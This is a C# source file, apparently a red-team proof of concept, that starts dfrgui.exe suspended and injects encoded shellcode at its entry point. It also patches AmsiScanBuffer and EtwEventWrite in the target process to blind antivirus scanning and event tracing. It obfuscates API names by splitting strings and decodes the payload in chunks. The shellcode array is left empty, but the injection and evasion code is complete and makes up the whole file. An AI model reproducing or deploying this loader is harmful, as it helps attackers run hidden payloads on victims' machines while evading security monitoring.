using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;

namespace ConsoleApp1
{
	
	public class PatchAMSIAndETW
	{
		public enum Protection : uint
    {
        PAGE_NOACCESS = 0x01,
        PAGE_READONLY = 0x02,
        PAGE_READWRITE = 0x04,
        PAGE_WRITECOPY = 0x08,
        PAGE_EXECUTE = 0x10,
        PAGE_EXECUTE_READ = 0x20,
        PAGE_EXECUTE_READWRITE = 0x40,
        PAGE_EXECUTE_WRITECOPY = 0x80,
        PAGE_GUARD = 0x100,
        PAGE_NOCACHE = 0x200,
        PAGE_WRITECOMBINE = 0x400
    }

    public enum ProcessAccessFlags : uint
    {
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VMOperation = 0x00000008,
        VMRead = 0x00000010,
        VMWrite = 0x00000020,
        DupHandle = 0x00000040,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        Synchronize = 0x00100000,
        All = 0x001F0FFF
    }
		
		// https://github.com/claissg/remote_amsi_bypass/blob/master/remote_process_amsi_bypass.cs
		
		[DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string ddltoLoad);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

    [DllImport("kernel32.dll")]
    internal static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    internal static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

		private static void PatchETW(IntPtr hProcess)
		{
			try 
			{
				var patch = new byte[] { 0xc3 };
        var address = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWrite");

        VirtualProtectEx(hProcess, address, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
        WriteProcessMemory(hProcess, address, patch, patch.Length, out IntPtr bytesWritten);
        VirtualProtectEx(hProcess, address, (UIntPtr)patch.Length, oldProtect, out uint x);
			}catch (Exception e)
			{
				Console.WriteLine(" [!] {0}", e.Message);
				Console.WriteLine(" [!] {0}", e.InnerException);
			}
		}

    private static void PatchAMSI(IntPtr hProcess)
		{
        try {
						var patch = new byte[] { 0xc3 };
		        var address = GetProcAddress(LoadLibrary("ams" + "i.dll"), "Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er");

		        VirtualProtectEx(hProcess, address, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
		        WriteProcessMemory(hProcess, address, patch, patch.Length, out IntPtr bytesWritten);
		        VirtualProtectEx(hProcess, address, (UIntPtr)patch.Length, oldProtect, out uint x);
        }catch (Exception e)
				{
            Console.WriteLine(" [!] {0}", e.Message);
            Console.WriteLine(" [!] {0}", e.InnerException);
        }
    }
			
		[System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
    [System.Security.SecurityCritical]
    public static void Mein(IntPtr hProcess)
		{
        PatchAMSI(hProcess);
        PatchETW(hProcess);
    }
	}
	
	class Program
	{

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
		struct STARTUPINFO
		{
			public Int32 cb;
			public IntPtr lpReserved;
			public IntPtr lpDesktop;
			public IntPtr lpTitle;
			public Int32 dwX;
			public Int32 dwY;
			public Int32 dwXSize;
			public Int32 dwYSize;
			public Int32 dwXCountChars;
			public Int32 dwYCountChars;
			public Int32 dwFillAttribute;
			public Int32 dwFlags;
			public Int16 wShowWindow;
			public Int16 cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}

		[StructLayout(LayoutKind.Sequential)]
		internal struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;
			public IntPtr hThread;
			public int dwProcessId;
			public int dwThreadId;
		}

		[StructLayout(LayoutKind.Sequential)]
		internal struct PROCESS_BASIC_INFORMATION
		{
			public IntPtr Reserved1;
			public IntPtr PebAddress;
			public IntPtr Reserved2;
			public IntPtr Reserved3;
			public IntPtr UniquePid;
			public IntPtr MoreReserved;
		}

		[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
		static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

		[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
		private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

		[DllImport("kernel32.dll")]
		static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern uint ResumeThread(IntPtr hThread);

		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();
		
		// Yes the code is shit, but meh so what - not like I have the whole day to write good pocs
		private static int jawohl(IntPtr hProcess, byte[] inputz, IntPtr addr, int position, int key)
		{
			int fixSize = 100;
			byte[] slice = new byte[]{};
			byte[] remainder = new byte[0];
			int len = inputz.Length;
			
			if(len > fixSize)
			{
				slice = new byte[fixSize];
				for (int i = 0; i < fixSize; i++)
				{
				    slice[i] = inputz[i];
				}
				
				remainder = new byte[len-fixSize];
				for (int i = 0; i < len-fixSize; i++)
				{
				    remainder[i] = inputz[i+fixSize];
				}
			}else
			{
				slice = new byte[len];
				for (int i = 0; i < len; i++)
				{
				    slice[i] = inputz[i];
				}
			}
			
			// Decode the shellcode
			for (int i = 0; i < slice.Length; i++)
			{
			    slice[i] = (byte)(((uint)slice[i] - key) & 0xFF);
			}
			
			IntPtr ptr;
			if(position == 0)
			{
				ptr = addr;
			}else
			{
				ptr = IntPtr.Add(addr, fixSize);
			}
			IntPtr nRead = IntPtr.Zero;
			WriteProcessMemory(hProcess, ptr, slice, slice.Length, out nRead);
			
			if(len > fixSize)
			{
				position += fixSize;
				jawohl(hProcess, remainder, ptr, position, key);
			}
			
			return len;
		}

		static void Main()
		{
			STARTUPINFO si = new STARTUPINFO();
			PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

			bool res = CreateProcess(null, "C:\\Windows\\System32\\" + "dfrgui.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

			PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
			uint tmp = 0;
			IntPtr hProcess = pi.hProcess;
			ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
			IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

			byte[] addrBuf = new byte[IntPtr.Size];
			IntPtr nRead = IntPtr.Zero;
			ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
			IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

			byte[] data = new byte[0x200];
			ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

			uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
			uint opthdr = e_lfanew_offset + 0x28;
			uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

			IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

			byte[] buf = new byte[] { /* shellcode */ };

			int key = 666; // key used to encode the shellcode
			
			PatchAMSIAndETW.Mein(hProcess);
			
			jawohl(hProcess, buf, addressOfEntryPoint, 0, key);

			ResumeThread(pi.hThread);
		}
	}
}
